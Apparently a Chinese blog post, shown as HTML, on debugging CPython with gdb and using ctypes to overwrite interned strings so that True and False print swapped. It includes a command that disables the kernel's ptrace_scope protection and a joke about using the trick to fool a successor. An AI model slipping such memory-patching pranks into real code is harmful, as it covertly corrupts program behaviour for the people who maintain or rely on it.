    <content type="html"><![CDATA[<h1 id="前言"><a class="headerlink" href="#前言"></a>前言</h1><p>这是一篇闲蛋疼的文章, 讲述了闲蛋疼的我是如何<s>历经千辛万苦终于</s>在 Python 中让 <code>'a' is 'b'</code> 得到 <code>True</code>.</p><p><s>(虽然这件事情毫无意义)</s></p><p><s>(不过拿来坑下一任或许是个好主意呢)</s></p><a id="more"></a><h1 id="动机"><a class="headerlink" href="#动机"></a>动机</h1><p>这个想法最早在六月中旬就产生了, 主要是看了知乎上的两个回答,</p><ul><li><a href="https://www.zhihu.com/question/39021759/answer/81901936" target="_blank" rel="noopener">如何用一段简单的代码讲述一个悲伤的故事？</a></li><li><a href="https://www.zhihu.com/question/27376156/answer/103135969" target="_blank" rel="noopener">Python 有什么奇技淫巧？</a></li></ul><p>然后我想, 那能不能来个 <code>'God' is 'girl' -&gt; True</code> 之类的.</p><p>当时也尝试了一下, xjb读了一下源码, 尝试使用 'a' 的内存覆盖 'b' 的内存, 然而最终只做到了 <code>hash('a') == hash('b')</code>.</p><p>而且读完 <code>is</code> 的源码后, 觉得这不大可能实现, 于是就放弃了. (因为发现 <code>is</code> 比较的是两个对象的指针, 而不是内容, 所以两个不同的对象进行比较是无论如何都不可能 True 的, 即使 hash 什么的都一模一样)</p><p>四个月后我又回想起了这个问题, 我觉得我应该有能力再次挑战了, 然后果然挑战成功了!</p><p>于是写下这篇文章, 记录一下自己在这个过程中学到的东西.</p><h1 id="先试试常规手段"><a class="headerlink" href="#先试试常规手段"></a>先试试常规手段</h1><h2 id="1-直接交换"><a class="headerlink" href="#1-直接交换"></a>1. 直接交换</h2><p><code>False = True</code></p><p>很简单粗暴的想法, 然而 python 的回应也很简单粗暴: 关键字不能赋值.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="literal">False</span> = <span class="literal">True</span></span><br><span class="line">  File <span class="string">"&lt;ipython-input-1-e3c38088f793&gt;"</span>, line <span class="number">1</span></span><br><span class="line">    <span class="literal">False</span> = <span class="literal">True</span></span><br><span class="line">                ^</span><br><span class="line">SyntaxError: can<span class="string">'t assign to keyword</span></span><br></pre></td></tr></table></figure><blockquote><p>在 Python2 中, 这行代码其实是可以执行的, 不过这只是改变了字面量 <code>False</code> 的值,  并没有达到我的要求.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="literal">False</span> = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="number">1</span> == <span class="number">2</span></span><br><span class="line">Out[<span class="number">2</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="literal">False</span></span><br><span class="line">Out[<span class="number">2</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="2-globals"><a class="headerlink" href="#2-globals"></a>2. <code>globals()</code></h2><p>既然不能直接赋值, 那试试用 <code>globals()</code> 来赋值?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: globals()[<span class="string">'a'</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: a</span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: globals()[<span class="string">'False'</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="literal">False</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>仍然失败, 想想也是, 在 Python3 中 <code>False</code> 已经是一个关键字了, 优先级肯定高于变量. 即使有同名变量也会被遮蔽.</p><h2 id="3-重载-eq"><a class="headerlink" href="#3-重载-eq"></a>3. 重载 <code>__eq__</code></h2><p>想对身为关键字的 <code>True</code> 和 <code>False</code> 做点什么实在是太难了,<br>换个思路试试: 重载 <code>str.__eq__</code>, 让它不管三七二十一全部返回 <code>True</code> ! 妙啊妙啊, 我真是太聪明了.</p><p>虽然不能做到 <code>'a' is 'b'</code> 但能实现 <code>'a' == 'b'</code> 的话也是一个进步啊.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: int.__eq__ = <span class="keyword">lambda</span> : <span class="literal">True</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-10</span><span class="number">-71</span>a46054a87d&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 int.__eq__ = lambda : True</span><br><span class="line"></span><br><span class="line">TypeError: can<span class="string">'t set attributes of built-in/extension type '</span>int<span class="string">'</span></span><br></pre></td></tr></table></figure><p>然而又失败了...</p><h2 id="4-重载-repr"><a class="headerlink" href="#4-重载-repr"></a>4. 重载 <code>__repr__</code></h2><p>不死心的我又想试试 <code>__repr__</code>, 让 <code>bool</code> 对象的 <code>__repr__</code> 始终返回 True</p><p>仍然失败了, 嘛...毕竟是内置类型.</p><p>看来内置的玩意儿通过常规方法是改不了, 那就读源码, 用 ctypes 强行改一波内存.</p><blockquote><p>后来我还想到一种适用于 ipython 的方法, 即自定义一个 ipython formatter, 相当于 ipython 专用的 <code>__repr__</code></p><p>比如我曾经实现过的一个小插件, 可以让一个 bytes 不管是否包含可见字符, 都以十六进制的形式输出<br><a href="https://gist.github.com/Aloxaf/de3de8e7c0b8913335847afd3ff76cc7" target="_blank" rel="noopener">https://gist.github.com/Aloxaf/de3de8e7c0b8913335847afd3ff76cc7</a></p><p>然而还是没有什么卵用...bool类型跟开挂一样无视了 ipython formatter</p><p>这个很奇怪, 不过原因以后再找</p></blockquote><h1 id="还是老老实实读源码吧"><a class="headerlink" href="#还是老老实实读源码吧"></a>还是老老实实读源码吧</h1><h2 id="0-搭建调试环境"><a class="headerlink" href="#0-搭建调试环境"></a>0. 搭建调试环境</h2><p>这几个月熟悉了一下棒棒的 gdb, 这次要利用起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gitee 的唯一用处</span></span><br><span class="line">wget https://gitee.com/Aloxaf/cpython/repository/archive/v3.7.1.zip</span><br><span class="line">unzip v3.7.1.zip</span><br><span class="line"><span class="built_in">cd</span> cpython</span><br><span class="line">./configure --with-pydebug</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>非常迅速地编译完了, 接下来运行 <code>gdb ./python</code>.<br>不出意外的话会提示你给 <code>python-gdb.py</code> 添加一个啥 <code>add-auto-load-safe-path</code> 到 <code>~/.gdbinit</code>, 照它说的添加就行. 可以提升调试体验.<br>(如果你的 gdb 什么插件都没装的话, 建议安装一个 pwndbg, <s>能让你从此爱上 gdb</s>)</p><p>然后运行 <code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code> 允许 attach 进程</p><p>接着创建一个 Python 文件, 写入如下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="number">1</span> == <span class="number">1</span>, <span class="number">1</span> == <span class="number">2</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后 <code>./python test.py&amp;</code> 执行, 记录 pid 并用 <code>gdb ./python $PID</code> attach 到 Python 进程上.</p><p>~~阅读源码我没找到啥好软件(有棒棒的&quot;跳转到定义&quot;的那种), ~~<br><s>我用的 clion, 然而跳转太残废了, 也有可能是我不会配吧 (一般拿 clion 写的是 rust 233</s></p><p><s>所以我采用了 <code>ripgrep</code> 来搜索定义...然后在 clion 里手动定位....</s></p><p><s>(这个效率太感人了, 如果谁有什么好的方式还望不啬赐教.)</s></p><p>Google了一下这个问题, <a href="https://stackoverflow.com/questions/35297120/viewing-cpython-code-in-clion" target="_blank" rel="noopener">Viewing CPython Code in CLion</a></p><p>只需要创建一个小小的 CMakeLists.txt, 就能使用自动跳转了!!</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">make_minimum_required(VERSION <span class="number">3.0</span>)</span><br><span class="line"><span class="keyword">project</span>(cpython)</span><br><span class="line"></span><br><span class="line"><span class="keyword">file</span>(GLOB SOURCE_FILES</span><br><span class="line">    Python/*.c</span><br><span class="line">    Parser/*.c</span><br><span class="line">    Objects/*.c</span><br><span class="line">    Modules/*.c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_directories</span>(<span class="keyword">Include</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span>(cpython <span class="variable">$&#123;SOURCE_FILES&#125;</span>)</span><br></pre></td></tr></table></figure><h2 id="1-pyobject"><a class="headerlink" href="#1-pyobject"></a>1. <code>PyObject *</code></h2><p>因为有了先前的经验, 这里直接 <code>b Python/ceval.c:2585</code> 就可以断在 <code>COMPARE_OP</code> 的地方.</p><p>(先前是不断单步走到这儿的...)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────[ SOURCE (CODE) ]─────────────────────────────</span><br><span class="line">   <span class="number">2580</span>         TARGET(COMPARE_OP) &#123;</span><br><span class="line">   <span class="number">2581</span>             PyObject *right = POP();</span><br><span class="line">   <span class="number">2582</span>             PyObject *left = TOP();</span><br><span class="line">   <span class="number">2583</span>             PyObject *res = cmp_outcome(oparg, left, right);</span><br><span class="line">   <span class="number">2584</span>             Py_DECREF(left);</span><br><span class="line"> ► <span class="number">2585</span>             Py_DECREF(right);</span><br><span class="line">   <span class="number">2586</span>             SET_TOP(res);</span><br><span class="line">   <span class="number">2587</span>             <span class="keyword">if</span> (res == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="number">2588</span>                 <span class="keyword">goto</span> error;</span><br><span class="line">   <span class="number">2589</span>             PREDICT(POP_JUMP_IF_FALSE);</span><br><span class="line">   <span class="number">2590</span>             PREDICT(POP_JUMP_IF_TRUE);</span><br></pre></td></tr></table></figure><p>通过 <code>py-list</code>可以查看当前执行到 .py 文件的哪一行.</p><p><code>p res</code>输出了 <code>$1 = False</code>, res 明明是 <code>PyObject *</code>类型, 却直接输出了内容, 这就是开始那个 <code>python-gdb.py</code> 的作用.</p><p><code>p *res</code> 解引用看一下这个结构体, 发现看不懂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  _ob_next = <span class="number">0x7fd80d9afba0</span>, </span><br><span class="line">  _ob_prev = <span class="number">0x7fd80d9afc08</span>, </span><br><span class="line">  ob_refcnt = <span class="number">138</span>, </span><br><span class="line">  ob_type = <span class="number">0x6b2d00</span> &lt;PyBool_Type&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rg '} PyObject'</code> 搜索一下定义, 在 <code>Include/object.h:110</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _PyObject_HEAD_EXTRA            \</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> *_<span class="title">ob_next</span>;</span>           \</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> *_<span class="title">ob_prev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Nothing is actually declared to be a PyObject, but every pointer to</span></span><br><span class="line"><span class="comment"> * a Python object can be cast to a PyObject*.  This is inheritance built</span></span><br><span class="line"><span class="comment"> * by hand.  Similarly every pointer to a variable-size Python object can,</span></span><br><span class="line"><span class="comment"> * in addition, be cast to PyVarObject*.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span></span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span></span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure><p>大概意思就是不管什么对象大家都可以是 <code>PyObject *</code>, Python 内部也以这个指针来传递各种对象, 显得统一. 要取这个对象内容的时候再根据 <code>ob_type</code> 特事特办</p><blockquote><p>第一次调试到这里的时候我没认真看注释,<br>天真地以为通过 <code>memmove(id(True), id(False), sizeof(PyObject))</code> 就能用 True 的内容覆盖掉 False, 事实上 <code>sizeof(PyObject)</code> 根本根本不是 True Object 的真实大小.</p><p>那么, 把 <code>sizeof(PyObject)</code> 改大一点行不行? 其实还是不行, 原因在下面...</p></blockquote><h2 id="2-py-false-和-py-falsestruct"><a class="headerlink" href="#2-py-false-和-py-falsestruct"></a>2. <code>Py_False</code> 和 <code>_Py_FalseStruct</code></h2><p>那么问题来了, <code>False</code> 这玩意儿真实的(C)类型是什么?</p><p>在 <code>Python/ceval:4686</code> 行可以找到 <code>cmp_outcome</code> 的定义, 结尾是这么写的.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    v = res ? Py_True : Py_False;</span><br><span class="line">    Py_INCREF(v);</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说 (上一个)res 的值是 <code>Py_True</code> 或 <code>Py_False</code>, 而它俩的定义在 <code>Include/boolobject.h:21</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Py_False and Py_True are the only two bools in existence.</span></span><br><span class="line"><span class="comment">Don't forget to apply Py_INCREF() when returning either!!! */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don't use these directly */</span></span><br><span class="line">PyAPI_DATA(struct _longobject) _Py_FalseStruct, _Py_TrueStruct;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use these macros */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Py_False ((PyObject *) &amp;_Py_FalseStruct)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Py_True ((PyObject *) &amp;_Py_TrueStruct)</span></span><br></pre></td></tr></table></figure><p>可以发现,  <code>Py_False</code> 这玩意儿只是个宏, 代表的是 <code>_Py_FalseStruct</code> 的地址.<br>显然, 即使我们用 <code>_Py_TrueStruct</code> 的内容覆盖 <code>_Py_FalseStruct</code> 的内容, <code>Py_True</code> 和 <code>Py_False</code> 的值也不会受影响.</p><p>而且 <code>is</code> 操作符的实现非常简单粗暴, 也不大可能对 <code>is</code> 操作符动什么手脚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PyCmp_IS:</span><br><span class="line">    res = (v == w);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>就这么结束了吗? 不, 上次在 python repl 环境中无法重载内置类型的方法, 那直接写内存有没有可能重载呢?</p><h2 id="3-bool-repr"><a class="headerlink" href="#3-bool-repr"></a>3. <code>bool_repr</code></h2><p>在 <code>Python/boolobject.c:12</code> 可以看到 <code>bool_repr</code> 的实现,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> PyObject *false_str = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> PyObject *true_str = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> PyObject *</span><br><span class="line">bool_repr(PyObject *self)</span><br><span class="line">&#123;</span><br><span class="line">    PyObject *s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self == Py_True)</span><br><span class="line">        s = true_str ? true_str :</span><br><span class="line">            (true_str = PyUnicode_InternFromString(<span class="string">"True"</span>));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        s = false_str ? false_str :</span><br><span class="line">            (false_str = PyUnicode_InternFromString(<span class="string">"False"</span>));</span><br><span class="line">    Py_XINCREF(s);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一反应: 能不能改掉这个函数, 比如把这个 <code>==</code> 改成 <code>!=</code> 啥的? --不可能的 .text 段的东西哪儿能说改就改.</p><p>那有没有可能 hook 这个函数呢? <code>read -s ./python</code> 看一下, 真的有 <code>bool_repr</code> 这个函数, 可以 hook 的样子! --想多了这是 Debug 版才保留了这些符号...</p><p>有没有其他办法? 注意到这个函数中为了提高速度缓存了 <code>true_str</code> 和 <code>false_str</code>, 那直接 <code>false_str=true_str</code> 不就行了吗? 在 gdb 中执行 <code>p false_str=true_str</code> 然后继续执行, 可以在命令行里看到后面的输出都变成了 <code>True True</code>!</p><p>这个方法真是绝妙啊, 唯一的问题就是在 Python 中没有办法获得 <code>false_str</code> 和 <code>true_str</code> 的地址, 修改也就无从谈起了...</p><h2 id="4-pyunicode-type"><a class="headerlink" href="#4-pyunicode-type"></a>4. <code>PyUnicode_Type</code></h2><p>不要慌, 还没走到绝路.</p><p><code>false_str</code> 的真实类型是什么?  这玩意儿一定有某个地方存着 &quot;False&quot; 这个字符串吧, 而且这个对象是动态生成的, 我肯定有权限修改.</p><p><code>p *false_str</code> 看一下, 发现是 PyUnicode_Type</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">41</span> = &#123;</span><br><span class="line">  _ob_next = <span class="number">0x6b2ba0</span> &lt;_Py_FalseStruct&gt;, </span><br><span class="line">  _ob_prev = <span class="number">0x6b2b60</span> &lt;_Py_TrueStruct&gt;, </span><br><span class="line">  ob_refcnt = <span class="number">6</span>, </span><br><span class="line">  ob_type = <span class="number">0x6cf020</span> &lt;PyUnicode_Type&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>Objects/unicodeobject.c:12538</code> 可以找到 <code>unicode_repr</code> 函数, 部分内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">repr = PyUnicode_New(osize, <span class="built_in">max</span>);</span><br><span class="line"><span class="keyword">if</span> (repr == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">okind = PyUnicode_KIND(repr);</span><br><span class="line">odata = PyUnicode_DATA(repr);</span><br><span class="line"></span><br><span class="line">PyUnicode_WRITE(okind, odata, <span class="number">0</span>, quote);</span><br><span class="line">PyUnicode_WRITE(okind, odata, osize<span class="number">-1</span>, quote);</span><br></pre></td></tr></table></figure><p>repr 为返回值, 可以看出 repr 由 <code>PyUnicode_New</code> 初始化, 通过 <code>Py_Unicode_DATA</code> 获取其中的 data 部分, 目测为字符串存放的位置</p><p>先到 <code>Objects/unicodeobject.c:1233</code> 看看 <code>PyUnicode_New</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unicode = (PyCompactUnicodeObject *)obj;</span><br><span class="line"><span class="keyword">if</span> (is_ascii)</span><br><span class="line">    data = ((PyASCIIObject*)obj) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    data = unicode + <span class="number">1</span>;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (is_ascii) &#123;</span><br><span class="line">    ((<span class="keyword">char</span>*)data)[<span class="built_in">size</span>] = <span class="number">0</span>;</span><br><span class="line">    _PyUnicode_WSTR(unicode) = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>! 将 obj 转为 <code>PyASCIIObject*</code> 再 +1 再转为 <code>char*</code>, 似乎就是字符串存放的真正地址了?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (<span class="keyword">char</span> *)((PyASCIIObject *)false_str + <span class="number">1</span>)</span><br><span class="line">$<span class="number">47</span> = <span class="number">0x7fd80d9afbe0</span> <span class="string">"True"</span> <span class="comment">//注意因为先前已经 false_str=true_str 了所以这里是 True</span></span><br></pre></td></tr></table></figure><p>wow, 没错! 这真是相当 excited.</p><p>又因为<code>sizeof(PyASCIIObject) == 64</code>, 那么 <code>false_str + 64</code> 也就是 <code>id('False') + 64</code> 就是字符串的位置了.</p><p>写成 Python 代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">print(<span class="literal">True</span>, <span class="literal">False</span>) <span class="comment"># 确保已经生成了对应的字符串</span></span><br><span class="line">false_str_addr = id(<span class="string">'False'</span>) + <span class="number">64</span> <span class="comment"># Debug 版</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> zip(range(<span class="number">5</span>), <span class="string">b'True\x00'</span>):</span><br><span class="line">    ctypes.c_char.from_address(false_str_addr + i).value = c <span class="comment"># 直接 strcpy 出错了 不造为啥</span></span><br></pre></td></tr></table></figure><p>不过有一点比较迷, 就是系统自带的 Python, 偏移量并不是64, 而是 48. 难道是gcc的迷之优化?</p><h1 id="最终代码-互换-true-false"><a class="headerlink" href="#最终代码-互换-true-false"></a>最终代码: 互换 True False</h1><p>注意到 <code>PyASCIIObject</code> 有个 <code>length</code> 指定了字符串长度, 修改的时候最好一起改掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(PyASCIIObject *)true_str</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  ob_base = &#123;</span><br><span class="line">    _ob_next = <span class="number">0x6b2ba0</span> &lt;_Py_FalseStruct&gt;, </span><br><span class="line">    _ob_prev = <span class="number">0x6b2b60</span> &lt;_Py_TrueStruct&gt;, </span><br><span class="line">    ob_refcnt = <span class="number">6</span>, </span><br><span class="line">    ob_type = <span class="number">0x6cf020</span> &lt;PyUnicode_Type&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  length = <span class="number">4</span>, </span><br><span class="line">  hash = <span class="number">-8576775955766428395</span>, </span><br><span class="line">  state = &#123;</span><br><span class="line">    interned = <span class="number">1</span>, </span><br><span class="line">    kind = <span class="number">1</span>, </span><br><span class="line">    compact = <span class="number">1</span>, </span><br><span class="line">    ascii = <span class="number">1</span>, </span><br><span class="line">    <span class="built_in">ready</span> = <span class="number">1</span></span><br><span class="line">  &#125;, </span><br><span class="line">  wstr = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">print(<span class="literal">True</span>, <span class="literal">False</span>) <span class="comment"># 确保已经生成了对应的字符串</span></span><br><span class="line">false_addr = id(<span class="string">'False'</span>)</span><br><span class="line">true_addr = id(<span class="string">'True'</span>)</span><br><span class="line"></span><br><span class="line">read_char = <span class="keyword">lambda</span> n: ctypes.c_char.from_address(n)</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">b''</span>.join([read_char(false_addr + i).value <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>)])</span><br><span class="line">str_offset = tmp.index(<span class="string">b'False'</span>) <span class="comment"># 定位字符串所在位置</span></span><br><span class="line">length_offset = tmp.index(<span class="string">b'\x05'</span>) <span class="comment"># 定位长度所在位置(这个有点不放心...)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改字符串</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> zip(range(<span class="number">5</span>), <span class="string">b'True\x00'</span>):</span><br><span class="line">    read_char(false_addr + str_offset + i).value = c</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> zip(range(<span class="number">6</span>), <span class="string">b'False\x00'</span>):</span><br><span class="line">    read_char(true_addr + str_offset + i).value = c</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 修改长度</span></span><br><span class="line">read_char(false_addr + length_offset).value = <span class="string">b'\x04'</span></span><br><span class="line">read_char(true_addr + length_offset).value = <span class="string">b'\x05'</span></span><br></pre></td></tr></table></figure><p>效果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">2</span>]: <span class="keyword">print</span> <span class="literal">True</span>, <span class="literal">False</span></span><br><span class="line">------&gt; print(True, False)</span><br><span class="line"><span class="literal">False</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="number">1</span> == <span class="number">2</span></span><br><span class="line">Out[<span class="number">3</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: <span class="string">'God'</span> <span class="keyword">is</span> <span class="string">'girl'</span></span><br><span class="line">Out[<span 